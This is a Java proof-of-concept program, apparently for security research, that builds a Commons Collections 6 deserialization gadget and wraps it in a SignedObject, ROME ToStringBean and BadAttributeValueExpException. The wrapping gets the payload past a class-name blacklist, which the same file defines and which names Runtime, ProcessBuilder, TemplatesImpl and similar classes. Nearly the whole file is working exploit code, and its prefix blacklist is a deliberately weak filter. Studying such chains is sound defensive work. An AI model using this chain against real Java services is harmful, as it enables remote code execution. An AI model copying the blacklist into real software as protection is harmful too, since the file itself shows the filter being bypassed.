package com.example;

import com.sun.syndication.feed.impl.ToStringBean;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InvalidClassException;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.security.Signature;

import javax.management.BadAttributeValueExpException;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.SignedObject;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public class RomeBadChain {
    public static void main(String[] args) throws Exception {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();

        String direct = Utils.Serialize(Gadget_CC6.getPayload());
        try {
            deserializeWithBlacklist(direct);
            System.out.println("[!] direct gadget unexpectedly passed blacklist");
        } catch (InvalidClassException e) {
            System.out.println("[+] direct gadget blocked: " + e.classname);
        }

        SignedObject signedObject = new SignedObject(Gadget_CC6.getPayload(), kp.getPrivate(), Signature.getInstance("DSA"));

        ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(toStringBean);

        String barr = Utils.Serialize(badAttributeValueExpException);
        System.out.println("[+] serialized RomeBadChain payload len=" + barr.length());

        // First-layer blacklist only controls the endpoint ObjectInputStream.
        deserializeWithBlacklist(barr);
    }

    private static Object deserializeWithBlacklist(String base64) throws Exception {
        byte[] data = Base64.getDecoder().decode(base64);
        try (BlacklistObjectInputStream ois = new BlacklistObjectInputStream(new ByteArrayInputStream(data))) {
            return ois.readObject();
        }
    }

    private static final List<String> BLACKLIST = new ArrayList<>();

    private static final class BlacklistObjectInputStream extends ObjectInputStream {
        private BlacklistObjectInputStream(ByteArrayInputStream in) throws IOException {
            super(in);
        }

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
            String className = desc.getName();
            for (String blockedPrefix : BLACKLIST) {
                if (className.startsWith(blockedPrefix)) {
                    throw new InvalidClassException("Unauthorized deserialization attempt", className);
                }
            }
            return super.resolveClass(desc);
        }
    }

    static {
        BLACKLIST.add("com.sun.jndi");
        BLACKLIST.add("com.fasterxml.jackson");
        BLACKLIST.add("org.springframework");
        BLACKLIST.add("com.sun.rowset.JdbcRowSetImpl");
        BLACKLIST.add("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        BLACKLIST.add("java.lang.Runtime");
        BLACKLIST.add("java.lang.ProcessBuilder");
        BLACKLIST.add("java.util.PriorityQueue");
    }
}

